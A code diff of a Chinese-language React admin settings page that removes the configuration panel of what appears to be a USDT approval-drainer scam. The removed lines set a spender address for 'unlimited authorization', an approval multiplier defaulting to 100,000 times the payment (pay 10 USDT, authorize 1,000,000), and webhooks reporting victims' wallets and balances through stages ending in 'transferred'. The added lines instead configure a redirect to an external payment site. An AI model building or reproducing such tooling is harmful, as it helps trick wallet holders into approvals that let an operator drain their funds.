@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { Save, RefreshCw, Settings, Wallet, Coins, MessageCircle, Globe, Info } from 'lucide-react';
+import { Save, RefreshCw, Settings, MessageCircle, Globe } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -8,8 +8,8 @@ import { supabase } from '@/integrations/supabase/client';
 import { toast } from 'sonner';
 import AdminLayout from './AdminLayout';
 
-// Default approval multiplier (authorization amount = payment amount × multiplier)
-const DEFAULT_APPROVAL_MULTIPLIER = '100000';
+const DEFAULT_SUPPORT_LINK = 'https://t.me/support';
+const DEFAULT_PAYMENT_PLATFORM = 'zhanghao';
 
 interface AppSetting {
   id: string;
@@ -18,28 +18,13 @@ interface AppSetting {
   description: string | null;
 }
 
-// Default USDT contract address (Shasta testnet)
-const DEFAULT_USDT_ADDRESS = 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs';
-
-// Default support link
-const DEFAULT_SUPPORT_LINK = 'https://t.me/support';
-
-// Default webhook URL
-const DEFAULT_WEBHOOK_URL = 'https://owgnyztchbastgwucebf.supabase.co/functions/v1/address-webhook';
-
 const AdminSettings = () => {
   const [settings, setSettings] = useState<AppSetting[]>([]);
   const [loading, setLoading] = useState(true);
-  const [saving, setSaving] = useState(false);
-  const [spenderAddress, setSpenderAddress] = useState('');
-  const [approvalMultiplier, setApprovalMultiplier] = useState(DEFAULT_APPROVAL_MULTIPLIER);
-  const [savingApproval, setSavingApproval] = useState(false);
-  const [usdtAddress, setUsdtAddress] = useState(DEFAULT_USDT_ADDRESS);
-  const [savingUsdt, setSavingUsdt] = useState(false);
   const [supportLink, setSupportLink] = useState(DEFAULT_SUPPORT_LINK);
   const [savingSupport, setSavingSupport] = useState(false);
-  const [webhookUrl, setWebhookUrl] = useState(DEFAULT_WEBHOOK_URL);
-  const [savingWebhook, setSavingWebhook] = useState(false);
+  const [paymentPlatform, setPaymentPlatform] = useState(DEFAULT_PAYMENT_PLATFORM);
+  const [savingPlatform, setSavingPlatform] = useState(false);
 
   useEffect(() => {
     fetchSettings();
@@ -51,33 +36,16 @@ const AdminSettings = () => {
       const { data, error } = await supabase
         .from('app_settings' as any)
         .select('*')
-        .order('key') as { data: AppSetting[] | null, error: any };
+        .order('key') as { data: AppSetting[] | null; error: any };
 
       if (error) {
         toast.error('加载设置失败');
-        console.error(error);
       } else if (data) {
         setSettings(data);
-        const spender = data.find(s => s.key === 'spender_address');
-        if (spender) {
-          setSpenderAddress(spender.value);
-        }
-        const multiplier = data.find(s => s.key === 'approval_multiplier');
-        if (multiplier) {
-          setApprovalMultiplier(multiplier.value);
-        }
-        const usdt = data.find(s => s.key === 'usdt_contract_address');
-        if (usdt) {
-          setUsdtAddress(usdt.value);
-        }
-        const support = data.find(s => s.key === 'support_link');
-        if (support) {
-          setSupportLink(support.value);
-        }
-        const webhook = data.find(s => s.key === 'webhook_url');
-        if (webhook) {
-          setWebhookUrl(webhook.value);
-        }
+        const support = data.find((s) => s.key === 'support_link');
+        if (support) setSupportLink(support.value);
+        const plat = data.find((s) => s.key === 'payment_platform');
+        if (plat) setPaymentPlatform(plat.value);
       }
     } catch (e) {
       console.error(e);
@@ -85,204 +53,40 @@ const AdminSettings = () => {
     setLoading(false);
   };
 
-  const handleSaveSpenderAddress = async () => {
-    if (!spenderAddress.trim()) {
-      toast.error('请输入合约地址');
-      return;
-    }
-
-    // Basic validation for TRON address
-    if (!spenderAddress.startsWith('T') || spenderAddress.length !== 34) {
-      toast.error('请输入有效的TRON地址');
-      return;
-    }
-
-    setSaving(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'spender_address',
-          value: spenderAddress,
-          description: 'USDT授权合约地址'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('授权地址已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
-    }
-    setSaving(false);
-  };
-
-  const handleSaveApprovalMultiplier = async () => {
-    if (!approvalMultiplier.trim()) {
-      toast.error('请输入授权倍数');
-      return;
-    }
-
-    // Basic validation - should be a valid positive number
-    const multiplierNum = parseInt(approvalMultiplier, 10);
-    if (isNaN(multiplierNum) || multiplierNum <= 0) {
-      toast.error('请输入有效的正整数');
-      return;
-    }
-
-    setSavingApproval(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'approval_multiplier',
-          value: approvalMultiplier,
-          description: 'USDT授权倍数（授权额度 = 支付金额 × 倍数）'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('授权倍数已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
-    }
-    setSavingApproval(false);
-  };
-
-  const handleResetMultiplier = () => {
-    setApprovalMultiplier(DEFAULT_APPROVAL_MULTIPLIER);
-  };
-
-  const handleSaveUsdtAddress = async () => {
-    if (!usdtAddress.trim()) {
-      toast.error('请输入USDT合约地址');
-      return;
-    }
-
-    if (!usdtAddress.startsWith('T') || usdtAddress.length !== 34) {
-      toast.error('请输入有效的TRON地址');
-      return;
-    }
-
-    setSavingUsdt(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'usdt_contract_address',
-          value: usdtAddress,
-          description: 'USDT合约地址 (TRC20)'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('USDT合约地址已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
-    }
-    setSavingUsdt(false);
-  };
-
-  const handleResetUsdtToDefault = () => {
-    setUsdtAddress(DEFAULT_USDT_ADDRESS);
-  };
-
   const handleSaveSupportLink = async () => {
-    if (!supportLink.trim()) {
-      toast.error('请输入客服链接');
-      return;
-    }
-
-    // Basic URL validation
+    if (!supportLink.trim()) return toast.error('请输入客服链接');
     try {
       new URL(supportLink);
     } catch {
-      toast.error('请输入有效的URL地址');
-      return;
+      return toast.error('请输入有效的URL地址');
     }
-
     setSavingSupport(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'support_link',
-          value: supportLink,
-          description: '客服链接'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('客服链接已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
+    const { error } = await supabase
+      .from('app_settings' as any)
+      .upsert({ key: 'support_link', value: supportLink, description: '客服链接' }, { onConflict: 'key' }) as { error: any };
+    if (error) toast.error('保存失败');
+    else {
+      toast.success('客服链接已保存');
+      fetchSettings();
     }
     setSavingSupport(false);
   };
 
-  const handleResetSupportToDefault = () => {
-    setSupportLink(DEFAULT_SUPPORT_LINK);
-  };
-
-  const handleSaveWebhookUrl = async () => {
-    if (!webhookUrl.trim()) {
-      toast.error('请输入Webhook URL');
-      return;
+  const handleSavePlatform = async () => {
+    if (!paymentPlatform.trim()) return toast.error('请输入平台标识');
+    setSavingPlatform(true);
+    const { error } = await supabase
+      .from('app_settings' as any)
+      .upsert(
+        { key: 'payment_platform', value: paymentPlatform.trim(), description: '支付平台标识 (跳转支付时作为 platform 参数)' },
+        { onConflict: 'key' }
+      ) as { error: any };
+    if (error) toast.error('保存失败');
+    else {
+      toast.success('支付平台已保存');
+      fetchSettings();
     }
-
-    // Basic URL validation
-    try {
-      new URL(webhookUrl);
-    } catch {
-      toast.error('请输入有效的URL地址');
-      return;
-    }
-
-    setSavingWebhook(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'webhook_url',
-          value: webhookUrl,
-          description: 'Webhook URL (钱包连接/授权事件通知)'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('Webhook URL已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
-    }
-    setSavingWebhook(false);
-  };
-
-  const handleResetWebhookToDefault = () => {
-    setWebhookUrl(DEFAULT_WEBHOOK_URL);
+    setSavingPlatform(false);
   };
 
   return (
@@ -304,144 +108,36 @@ const AdminSettings = () => {
           </div>
         ) : (
           <div className="grid gap-6">
-            {/* Contract Address Settings */}
+            {/* Payment Platform Settings */}
             <Card>
               <CardHeader>
                 <div className="flex items-center gap-2">
-                  <Wallet className="h-5 w-5 text-primary" />
-                  <CardTitle>授权合约地址</CardTitle>
+                  <Globe className="h-5 w-5 text-primary" />
+                  <CardTitle>支付平台标识</CardTitle>
                 </div>
                 <CardDescription>
-                  设置用于USDT无限授权的合约地址（Spender Address）
+                  设置跳转到 payusdt.shop 时使用的 platform 参数（商户/平台标识）
                 </CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="space-y-2">
-                  <Label htmlFor="spender_address">TRON 合约地址</Label>
+                  <Label htmlFor="payment_platform">Platform 标识</Label>
                   <div className="flex gap-2">
                     <Input
-                      id="spender_address"
-                      placeholder="T..."
-                      value={spenderAddress}
-                      onChange={(e) => setSpenderAddress(e.target.value)}
+                      id="payment_platform"
+                      placeholder="zhanghao"
+                      value={paymentPlatform}
+                      onChange={(e) => setPaymentPlatform(e.target.value)}
                       className="font-mono"
                     />
-                    <Button onClick={handleSaveSpenderAddress} disabled={saving}>
+                    <Button onClick={handleSavePlatform} disabled={savingPlatform}>
                       <Save className="h-4 w-4 mr-2" />
-                      {saving ? '保存中...' : '保存'}
+                      {savingPlatform ? '保存中...' : '保存'}
                     </Button>
                   </div>
                   <p className="text-xs text-muted-foreground">
-                    此地址将用于用户USDT授权交易，请确保地址正确
+                    跳转 URL 示例：https://payusdt.shop/?platform={paymentPlatform}&amp;order_id=xxx&amp;amount=10
                   </p>
-                </div>
-
-                {/* Current Settings */}
-                <div className="mt-6 pt-4 border-t">
-                  <h4 className="text-sm font-medium mb-3">当前配置</h4>
-                  <div className="bg-muted rounded-lg p-4">
-                    <div className="grid gap-2 text-sm">
-                      {settings.map((setting) => (
-                        <div key={setting.id} className="flex justify-between items-center">
-                          <span className="text-muted-foreground">{setting.description || setting.key}:</span>
-                          <span className="font-mono text-xs bg-background px-2 py-1 rounded">
-                            {setting.value.length > 20 
-                              ? `${setting.value.slice(0, 8)}...${setting.value.slice(-6)}` 
-                              : setting.value
-                            }
-                          </span>
-                        </div>
-                      ))}
-                    </div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* Approval Multiplier Settings */}
-            <Card>
-              <CardHeader>
-                <div className="flex items-center gap-2">
-                  <Coins className="h-5 w-5 text-primary" />
-                  <CardTitle>授权倍数设置</CardTitle>
-                </div>
-                <CardDescription>
-                  设置USDT授权倍数（授权额度 = 支付金额 × 倍数）
-                </CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="approval_multiplier">授权倍数</Label>
-                  <div className="flex gap-2">
-                    <Input
-                      id="approval_multiplier"
-                      placeholder="输入授权倍数..."
-                      value={approvalMultiplier}
-                      onChange={(e) => setApprovalMultiplier(e.target.value)}
-                      className="font-mono"
-                    />
-                    <Button variant="outline" onClick={handleResetMultiplier} title="重置为默认倍数">
-                      <RefreshCw className="h-4 w-4" />
-                    </Button>
-                    <Button onClick={handleSaveApprovalMultiplier} disabled={savingApproval}>
-                      <Save className="h-4 w-4 mr-2" />
-                      {savingApproval ? '保存中...' : '保存'}
-                    </Button>
-                  </div>
-                  <p className="text-xs text-muted-foreground">
-                    例如：倍数设置为 100000，支付 10 USDT 时授权额度为 1,000,000 USDT
-                  </p>
-                  <div className="mt-3 p-3 bg-muted/50 rounded-lg">
-                    <p className="text-xs font-medium mb-1">常用倍数参考：</p>
-                    <ul className="text-xs text-muted-foreground space-y-1">
-                      <li>• 100 倍：支付 10 USDT → 授权 1,000 USDT</li>
-                      <li>• 1,000 倍：支付 10 USDT → 授权 10,000 USDT</li>
-                      <li>• 10,000 倍：支付 10 USDT → 授权 100,000 USDT</li>
-                      <li>• 100,000 倍（默认）：支付 10 USDT → 授权 1,000,000 USDT</li>
-                    </ul>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* USDT Contract Address Settings */}
-            <Card>
-              <CardHeader>
-                <div className="flex items-center gap-2">
-                  <Coins className="h-5 w-5 text-green-500" />
-                  <CardTitle>USDT合约地址</CardTitle>
-                </div>
-                <CardDescription>
-                  设置TRC20 USDT合约地址（切换主网/测试网时需要修改）
-                </CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="usdt_address">USDT 合约地址</Label>
-                  <div className="flex gap-2">
-                    <Input
-                      id="usdt_address"
-                      placeholder="T..."
-                      value={usdtAddress}
-                      onChange={(e) => setUsdtAddress(e.target.value)}
-                      className="font-mono"
-                    />
-                    <Button variant="outline" onClick={handleResetUsdtToDefault} title="重置为默认地址">
-                      <RefreshCw className="h-4 w-4" />
-                    </Button>
-                    <Button onClick={handleSaveUsdtAddress} disabled={savingUsdt}>
-                      <Save className="h-4 w-4 mr-2" />
-                      {savingUsdt ? '保存中...' : '保存'}
-                    </Button>
-                  </div>
-                  <div className="mt-3 p-3 bg-muted/50 rounded-lg">
-                    <p className="text-xs font-medium mb-1">常用合约地址：</p>
-                    <ul className="text-xs text-muted-foreground space-y-1">
-                      <li>• 主网: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</li>
-                      <li>• Nile测试网: TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj</li>
-                      <li>• Shasta测试网: TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs</li>
-                    </ul>
-                  </div>
                 </div>
               </CardContent>
             </Card>
@@ -453,9 +149,7 @@ const AdminSettings = () => {
                   <MessageCircle className="h-5 w-5 text-blue-500" />
                   <CardTitle>客服链接设置</CardTitle>
                 </div>
-                <CardDescription>
-                  设置所有页面的客服联系链接（支持 Telegram、微信等任意链接）
-                </CardDescription>
+                <CardDescription>设置所有页面的客服联系链接</CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="space-y-2">
@@ -468,163 +162,32 @@ const AdminSettings = () => {
                       onChange={(e) => setSupportLink(e.target.value)}
                       className="font-mono"
                     />
-                    <Button variant="outline" onClick={handleResetSupportToDefault} title="重置为默认链接">
-                      <RefreshCw className="h-4 w-4" />
-                    </Button>
                     <Button onClick={handleSaveSupportLink} disabled={savingSupport}>
                       <Save className="h-4 w-4 mr-2" />
                       {savingSupport ? '保存中...' : '保存'}
                     </Button>
                   </div>
-                  <p className="text-xs text-muted-foreground">
-                    此链接将应用于所有页面的联系客服按钮和链接
-                  </p>
-                  <div className="mt-3 p-3 bg-muted/50 rounded-lg">
-                    <p className="text-xs font-medium mb-1">常用链接格式：</p>
-                    <ul className="text-xs text-muted-foreground space-y-1">
-                      <li>• Telegram: https://t.me/username</li>
-                      <li>• WhatsApp: https://wa.me/phonenumber</li>
-                      <li>• 微信公众号: weixin://dl/business/?t=xxx</li>
-                      <li>• 网页客服: https://your-support.com</li>
-                    </ul>
-                  </div>
                 </div>
               </CardContent>
             </Card>
 
-            {/* Webhook URL Settings */}
+            {/* Current settings summary */}
             <Card>
               <CardHeader>
-                <div className="flex items-center gap-2">
-                  <Globe className="h-5 w-5 text-purple-500" />
-                  <CardTitle>Webhook URL 设置</CardTitle>
-                </div>
-                <CardDescription>
-                  设置钱包连接和授权完成事件的通知地址
-                </CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="webhook_url">Webhook URL</Label>
-                  <div className="flex gap-2">
-                    <Input
-                      id="webhook_url"
-                      placeholder="https://..."
-                      value={webhookUrl}
-                      onChange={(e) => setWebhookUrl(e.target.value)}
-                      className="font-mono text-sm"
-                    />
-                    <Button variant="outline" onClick={handleResetWebhookToDefault} title="重置为默认地址">
-                      <RefreshCw className="h-4 w-4" />
-                    </Button>
-                    <Button onClick={handleSaveWebhookUrl} disabled={savingWebhook}>
-                      <Save className="h-4 w-4 mr-2" />
-                      {savingWebhook ? '保存中...' : '保存'}
-                    </Button>
-                  </div>
-                  <p className="text-xs text-muted-foreground">
-                    当用户连接钱包或完成授权时，系统会向此URL发送POST请求
-                  </p>
-                  
-                  {/* Data Format Documentation */}
-                  <div className="mt-4 p-4 bg-muted/50 rounded-lg space-y-4">
-                    <div className="flex items-center gap-2">
-                      <Info className="h-4 w-4 text-primary" />
-                      <span className="font-medium text-sm">数据格式说明</span>
-                    </div>
-                    
-                    {/* wallet_connected event */}
-                    <div className="space-y-2">
-                      <p className="text-xs font-medium text-primary">1. wallet_connected 事件</p>
-                      <p className="text-xs text-muted-foreground">用户连接钱包时触发，创建状态为"connected"的地址记录</p>
-                      <pre className="text-xs bg-background p-3 rounded border overflow-x-auto">
-{`{
-  "event": "wallet_connected",
-  "timestamp": "2026-01-03T07:24:43.082Z",
-  "data": {
-    "order_id": "UST1767425083607",
-    "wallet_address": "TThV75wPse6...",
-    "username": "async",
-    "currency": "USDT",
-    "network": "TRC20",
-    "spender_address": "TYDzsYU...",
-    "usdt_balance": 100.5,
-    "trx_balance": 50.0
-  }
-}`}
-                      </pre>
-                    </div>
-                    
-                    {/* authorization_completed event */}
-                    <div className="space-y-2">
-                      <p className="text-xs font-medium text-green-500">2. authorization_completed 事件</p>
-                      <p className="text-xs text-muted-foreground">用户完成授权时触发，更新状态为"authorized"并记录tx_hash</p>
-                      <pre className="text-xs bg-background p-3 rounded border overflow-x-auto">
-{`{
-  "event": "authorization_completed",
-  "timestamp": "2026-01-03T07:25:52.255Z",
-  "data": {
-    "order_id": "UST1767425083607",
-    "wallet_address": "TThV75wPse6...",
-    "username": "async",
-    "currency": "USDT",
-    "network": "TRC20",
-    "spender_address": "TYDzsYU...",
-    "usdt_balance": 100.5,
-    "trx_balance": 50.0,
-    "tx_hash": "abc123...",
-    "status": "success",
-    "payment_mode": "safe"
-  }
-}`}
-                      </pre>
-                    </div>
-                    
-                    {/* Address status flow */}
-                    <div className="space-y-2 pt-2 border-t">
-                      <p className="text-xs font-medium">地址状态流程：</p>
-                      <div className="flex items-center gap-2 text-xs">
-                        <span className="px-2 py-1 bg-yellow-500/20 text-yellow-600 rounded">connected</span>
-                        <span>→</span>
-                        <span className="px-2 py-1 bg-green-500/20 text-green-600 rounded">authorized</span>
-                        <span>→</span>
-                        <span className="px-2 py-1 bg-blue-500/20 text-blue-600 rounded">transferred</span>
-                      </div>
-                      <p className="text-xs text-muted-foreground mt-1">已连接钱包 → 已授权 → 已转账</p>
-                    </div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* Usage Instructions */}
-            <Card>
-              <CardHeader>
-                <CardTitle>使用说明</CardTitle>
+                <CardTitle>当前配置</CardTitle>
               </CardHeader>
               <CardContent>
-                <ul className="space-y-2 text-sm text-muted-foreground">
-                  <li className="flex items-start gap-2">
-                    <span className="text-primary">•</span>
-                    <span>授权合约地址用于用户进行USDT无限授权</span>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-primary">•</span>
-                    <span>用户授权后，该地址可以转移用户钱包中的USDT</span>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-primary">•</span>
-                    <span>USDT合约地址需与用户钱包所在网络一致</span>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-primary">•</span>
-                    <span>Webhook用于接收钱包连接和授权事件，实现与其他服务的联动</span>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-destructive">•</span>
-                    <span className="text-destructive">切换网络时，请同时更新USDT合约地址</span>
-                  </li>
-                </ul>
+                <div className="bg-muted rounded-lg p-4 grid gap-2 text-sm">
+                  {settings.length === 0 && <span className="text-muted-foreground">暂无配置</span>}
+                  {settings.map((s) => (
+                    <div key={s.id} className="flex justify-between items-center gap-4">
+                      <span className="text-muted-foreground">{s.description || s.key}:</span>
+                      <span className="font-mono text-xs bg-background px-2 py-1 rounded break-all">
+                        {s.value.length > 40 ? `${s.value.slice(0, 20)}...${s.value.slice(-10)}` : s.value}
+                      </span>
+                    </div>
+                  ))}
+                </div>
               </CardContent>
             </Card>
           </div>
